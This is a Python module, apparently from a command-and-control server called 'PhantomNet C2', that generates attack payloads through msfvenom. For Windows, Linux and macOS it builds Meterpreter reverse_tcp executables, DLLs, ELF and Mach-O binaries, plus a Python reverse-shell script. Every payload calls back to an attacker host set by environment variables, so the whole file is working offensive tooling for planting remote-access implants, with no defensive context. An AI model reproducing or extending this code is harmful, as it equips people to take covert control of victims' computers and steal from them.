"""
Payload generation module for PhantomNet C2 Server
"""

import os
import logging
import subprocess
from typing import Dict, Any, Optional

logger = logging.getLogger(__name__)

class PayloadGenerator:
    """Handles payload generation using Metasploit Framework"""

    def __init__(self):
        self.payload_templates = {
            'windows': self.generate_windows_payload,
            'linux': self.generate_linux_payload,
            'macos': self.generate_macos_payload
        }

    def generate_payload(self, platform: str, architecture: str, payload_type: str = 'exe') -> Optional[Dict[str, Any]]:
        """Generate payload for specified platform and architecture"""
        if platform in self.payload_templates:
            return self.payload_templates[platform](architecture, payload_type)
        return None

    def generate_windows_payload(self, architecture: str, payload_type: str) -> Optional[Dict[str, Any]]:
        """Generate Windows payload using msfvenom"""
        try:
            lhost = os.getenv('C2_SERVER_IP', '127.0.0.1')
            lport = os.getenv('C2_SERVER_PORT', '8443')

            if payload_type == 'exe':
                cmd = [
                    'msfvenom',
                    '-p', f'windows/{architecture}/meterpreter/reverse_tcp',
                    f'LHOST={lhost}',
                    f'LPORT={lport}',
                    '-f', 'exe'
                ]
                result = subprocess.run(cmd, capture_output=True)
                if result.returncode == 0:
                    return {
                        'data': result.stdout,
                        'type': payload_type,
                        'platform': 'windows',
                        'architecture': architecture
                    }
            elif payload_type == 'dll':
                cmd = [
                    'msfvenom',
                    '-p', f'windows/{architecture}/meterpreter/reverse_tcp',
                    f'LHOST={lhost}',
                    f'LPORT={lport}',
                    '-f', 'dll'
                ]
                result = subprocess.run(cmd, capture_output=True)
                if result.returncode == 0:
                    return {
                        'data': result.stdout,
                        'type': payload_type,
                        'platform': 'windows',
                        'architecture': architecture
                    }
        except Exception as e:
            logger.error(f"Windows payload generation failed: {e}")

        return self._get_default_payload(payload_type, 'windows', architecture)

    def generate_linux_payload(self, architecture: str, payload_type: str) -> Optional[Dict[str, Any]]:
        """Generate Linux payload using msfvenom"""
        try:
            lhost = os.getenv('C2_SERVER_IP', '127.0.0.1')
            lport = os.getenv('C2_SERVER_PORT', '8443')

            if payload_type == 'elf':
                cmd = [
                    'msfvenom',
                    '-p', f'linux/{architecture}/meterpreter/reverse_tcp',
                    f'LHOST={lhost}',
                    f'LPORT={lport}',
                    '-f', 'elf'
                ]
                result = subprocess.run(cmd, capture_output=True)
                if result.returncode == 0:
                    return {
                        'data': result.stdout,
                        'type': payload_type,
                        'platform': 'linux',
                        'architecture': architecture
                    }
            elif payload_type == 'sh':
                cmd = [
                    'msfvenom',
                    '-p', 'cmd/unix/reverse_python',
                    f'LHOST={lhost}',
                    f'LPORT={lport}',
                    '-f', 'raw'
                ]
                result = subprocess.run(cmd, capture_output=True)
                if result.returncode == 0:
                    return {
                        'data': result.stdout,
                        'type': payload_type,
                        'platform': 'linux',
                        'architecture': architecture
                    }
        except Exception as e:
            logger.error(f"Linux payload generation failed: {e}")

        return self._get_default_payload(payload_type, 'linux', architecture)

    def generate_macos_payload(self, architecture: str, payload_type: str) -> Optional[Dict[str, Any]]:
        """Generate macOS payload using msfvenom"""
        try:
            lhost = os.getenv('C2_SERVER_IP', '127.0.0.1')
            lport = os.getenv('C2_SERVER_PORT', '8443')

            if payload_type == 'macho':
                cmd = [
                    'msfvenom',
                    '-p', f'osx/{architecture}/meterpreter/reverse_tcp',
                    f'LHOST={lhost}',
                    f'LPORT={lport}',
                    '-f', 'macho'
                ]
                result = subprocess.run(cmd, capture_output=True)
                if result.returncode == 0:
                    return {
                        'data': result.stdout,
                        'type': payload_type,
                        'platform': 'macos',
                        'architecture': architecture
                    }
        except Exception as e:
            logger.error(f"macOS payload generation failed: {e}")

        return self._get_default_payload(payload_type, 'macos', architecture)

    def _get_default_payload(self, payload_type: str, platform: str, architecture: str) -> Dict[str, Any]:
        """Return a default payload when generation fails"""
        return {
            'data': b'# Payload data would be generated here',
            'type': payload_type,
            'platform': platform,
            'architecture': architecture
        }

    def list_available_payloads(self) -> Dict[str, list]:
        """List available payload types for each platform"""
        return {
            'windows': ['exe', 'dll'],
            'linux': ['elf', 'sh'],
            'macos': ['macho']
        }

    def validate_payload_requirements(self) -> Dict[str, bool]:
        """Check if required tools are available"""
        requirements = {
            'msfvenom': True,
            'metasploit': True
        }

        # Check for msfvenom
        try:
            result = subprocess.run(['which', 'msfvenom'], capture_output=True, text=True)
            requirements['msfvenom'] = result.returncode == 0
        except:
            pass

        # Check for metasploit framework
        try:
            result = subprocess.run(['which', 'msfconsole'], capture_output=True, text=True)
            requirements['metasploit'] = result.returncode == 0
        except:
            pass

        return requirements
